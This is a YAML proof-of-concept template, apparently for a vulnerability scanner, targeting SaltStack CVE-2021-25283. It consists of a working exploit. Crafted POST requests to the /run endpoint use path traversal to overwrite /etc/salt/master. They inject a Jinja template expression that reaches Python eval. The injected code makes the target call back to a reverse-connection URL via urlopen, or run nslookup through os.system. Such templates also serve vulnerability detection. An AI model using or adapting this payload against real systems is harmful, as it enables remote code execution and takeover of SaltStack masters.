name: poc-yaml-saltstack-cve-2021-25283
set:
  reverse: newReverse()
  reversedomain: reverse.domain
  reverseurl: reverse.url
  reverseip: reverse.ip
groups:
  http:
    - method: GET
      path: /run
      follow_redirects: false
      expression: |
        response.status == 200 && response.body.bcontains(b"wheel_async")
    - method: POST
      path: /run
      headers:
        Content-Type: application/json
      body: |
        [{"client":"wheel_async","fun":"pillar_roots.write","data":"rest_cherrypy:\n  port: 8000\n  host: 0.0.0.0\n  disable_ssl: true\nexternal_auth:\n  pam:\nmaster_uri: tcp://127.0.0.1:4505\npassword: sdb://aaaaa/bbbbb?name=1\naaaaa:\n  driver: rest\n  bbbbb:\n    url: \"{{name}}{{().__class__.__bases__[0].__subclasses__()[-2].__init__.__globals__['__builtins__']['eval']('__import__(\\\"urllib.request\\\").request.urlopen(\\\"{{reverseurl}}/saltstack/bug\\\")')}}\"","path":"../../../../../etc/salt/master","token":"132132131213"}]
      expression: |
        response.status == 200 && reverse.wait(70)
  dns:
    - method: GET
      path: /run
      follow_redirects: false
      expression: |
        response.status == 200 && response.body.bcontains(b"wheel_async")
    - method: POST
      path: /run
      headers:
        Content-Type: application/json
      body: |
        [{"client":"wheel_async","fun":"pillar_roots.write","data":"rest_cherrypy:\n  port: 8000\n  host: 0.0.0.0\n  disable_ssl: true\nexternal_auth:\n  pam:\nmaster_uri: tcp://127.0.0.1:4505\npassword: sdb://aaaaa/bbbbb?name=1\naaaaa:\n  driver: rest\n  bbbbb:\n    url: \"{{name}}{{().__class__.__bases__[0].__subclasses__()[-2].__init__.__globals__['__builtins__']['eval']('__import__(\\\"os\\\").system(\\\"nslookup {{reversedomain}} {{reverseip}}\\\")')}}\"","path":"../../../../../etc/salt/master","token":"132132131213"}]
      expression: |
        response.status == 200 && reverse.wait(70)
detail:
  author: kkkbbb(https://github.com/kkkbbb)
  links:
    - https://mp.weixin.qq.com/s/-Kbl0rxxDmx2srceSN_IIA